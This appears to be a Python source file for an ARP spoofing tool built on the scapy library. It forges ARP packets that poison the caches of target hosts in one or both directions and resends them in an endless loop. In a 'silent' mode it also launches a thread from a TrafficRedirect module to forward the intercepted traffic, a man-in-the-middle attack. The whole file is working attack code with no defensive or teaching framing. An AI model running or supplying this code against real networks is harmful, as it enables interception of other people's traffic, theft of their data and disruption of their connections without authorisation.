import sys
import time
from scapy.all import *
from TrafficRedirect import TrafficRedirect

class ArpSpoofing():
    interface = 0

    def __init__(self, intFace):
        self.interface = intFace

    def doSpoof(self, target1, target2, target1MAC, target2MAC, oneway, silent, timeSleep):

        #This method obtains your own mac address
        def obtainMac():
            my_macs = [get_if_hwaddr(i) for i in get_if_list()]
            for mac in my_macs:
                if (mac != "00:00:00:00:00:00"):
                    return mac

        print("spoof")

        myMac = obtainMac()
        print("post obtainMac")

        #Ether part of packet
        etherPart = Ether(src=myMac)

        #Arp part of packet
        arpPartList = []
        if oneway == True:
            for i in range(len(target1)):
                for j in range(len(target2)):
                    arpPart = ARP(op="who-has", hwsrc=myMac, psrc=target2[j], hwdst=target1MAC[i], pdst=target1[i])
                    arpPartList.append(arpPart)
        elif oneway == False:
            for i in range(len(target1)):
                for j in range(len(target2)):
                    arpPart = ARP(op="who-has", hwsrc=myMac, psrc=target2[j], hwdst=target1MAC[i], pdst=target1[i])
                    arpPartList.append(arpPart)
                    arpPart = ARP(op="who-has", hwsrc=myMac, psrc=target1[i], hwdst=target2MAC[j], pdst=target2[j])
                    arpPartList.append(arpPart)
        #total packet
        packetList = []
        for part in arpPartList:
            packet = etherPart / part
            packetList.append(packet)

        #sends packet

        while True:
            for item in packetList:
                sendp(item, iface=self.interface, verbose=False)
            print("Spoof Spoof")
            if silent==True:
                redirecting = TrafficRedirect(self.interface)
                try:
                    print("before thread")
                    redirect = threading.Thread(name="redirectThread", target=redirecting.doRedirect, args=(
                    target1, target2, target1MAC, target2MAC))
                    redirect.daemon = True
                    redirect.start()
                    print("after thread")
                except:
                    print("Thread arp failed to start")

            time.sleep(timeSleep)




